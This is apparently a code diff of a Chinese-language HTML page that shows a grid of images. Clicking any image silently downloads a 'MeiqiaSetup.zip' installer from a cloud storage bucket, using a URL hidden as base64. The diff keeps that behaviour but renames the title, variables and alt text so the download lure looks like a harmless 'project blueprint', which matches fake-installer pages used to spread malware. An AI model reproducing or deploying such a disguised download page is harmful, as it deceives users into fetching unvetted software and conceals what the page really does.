@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>下载计划</title>
+    <title>项目蓝图</title>
     
     <style>
         :root {
-            --image-spacing: 2px;
+            --item-gap: 1px;
         }
 
         * {
@@ -16,80 +16,79 @@
             box-sizing: border-box;
         }
 
-        .image-container {
+        .content-grid {
             display: grid;
-            gap: var(--image-spacing);
+            gap: var(--item-gap);
         }
 
-        .download-image {
+        .content-item {
             width: 100%;
             height: auto;
             cursor: pointer;
-            transition: opacity 0.3s ease;
+            transition: transform 0.2s;
         }
 
-        .download-image:hover {
-            opacity: 0.9;
+        .content-item:hover {
+            transform: scale(0.98);
         }
     </style>
 </head>
 <body>
-    <main class="image-container"></main>
+    <section class="content-grid"></section>
 
     <script type="module">
-        // 图片数据和加密URL配置
-        const RESOURCES = {
-            images: Array.from({length: 5}, (_, i) => 
-                `static/picture/d_${String(i+1).padStart(2, '0')}.jpg`),
+        // 数据配置
+        const RESOURCE_CONFIG = {
+            visualElements: Array.from({length: 5}, (_, i) => 
+                `static/media/item_${String(i+1).padStart(2, '0')}.webp`),
             
-            encryptedUrls: Array(7).fill(
+            accessTokens: Array(7).fill(
                 'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA=='
             )
         };
 
-        // 工具函数
-        const decodeBase64 = str => atob(str);
+        // 数据处理方法
+        const decodePayload = str => atob(str);
         
-        const createDownload = url => {
-            const link = document.createElement('a');
-            link.href = url;
-            link.download = '';
-            link.style.display = 'none';
-            document.body.append(link);
-            link.click();
-            link.remove();
+        const activateResource = encodedData => {
+            const tempAnchor = document.createElement('a');
+            tempAnchor.href = decodePayload(encodedData);
+            tempAnchor.rel = 'noopener noreferrer';
+            document.body.append(tempAnchor);
+            tempAnchor.click();
+            tempAnchor.remove();
         };
 
-        // 图片加载器
-        const loadImages = container => {
-            RESOURCES.images.forEach(imgSrc => {
-                const img = new Image();
-                img.className = 'download-image';
-                img.src = imgSrc;
-                img.alt = '下载入口';
-                container.appendChild(img);
+        // 内容加载器
+        const initVisualElements = container => {
+            RESOURCE_CONFIG.visualElements.forEach(mediaSrc => {
+                const mediaElement = new Image();
+                mediaElement.className = 'content-item';
+                mediaElement.src = mediaSrc;
+                mediaElement.alt = '项目示意图';
+                mediaElement.loading = 'lazy';
+                container.appendChild(mediaElement);
             });
         };
 
-        // 事件处理器
-        const handleImageClick = ({target}) => {
-            if (!target.matches('.download-image')) return;
+        // 交互处理
+        const handleUserInteraction = ({target}) => {
+            if (!target.classList.contains('content-item')) return;
             
-            const index = [...target.parentElement.children].indexOf(target);
-            if (index in RESOURCES.encryptedUrls) {
-                const decodedUrl = decodeBase64(RESOURCES.encryptedUrls[index]);
-                createDownload(decodedUrl);
+            const itemIndex = [...target.parentElement.children].indexOf(target);
+            if (itemIndex in RESOURCE_CONFIG.accessTokens) {
+                activateResource(RESOURCE_CONFIG.accessTokens[itemIndex]);
             }
         };
 
-        // 初始化
-        const init = () => {
-            const container = document.querySelector('.image-container');
-            loadImages(container);
-            container.addEventListener('click', handleImageClick);
+        // 初始化流程
+        const bootstrap = () => {
+            const gridContainer = document.querySelector('.content-grid');
+            initVisualElements(gridContainer);
+            gridContainer.addEventListener('click', handleUserInteraction);
         };
 
-        document.addEventListener('DOMContentLoaded', init);
+        document.addEventListener('DOMContentLoaded', bootstrap);
     </script>
 </body>
 </html>
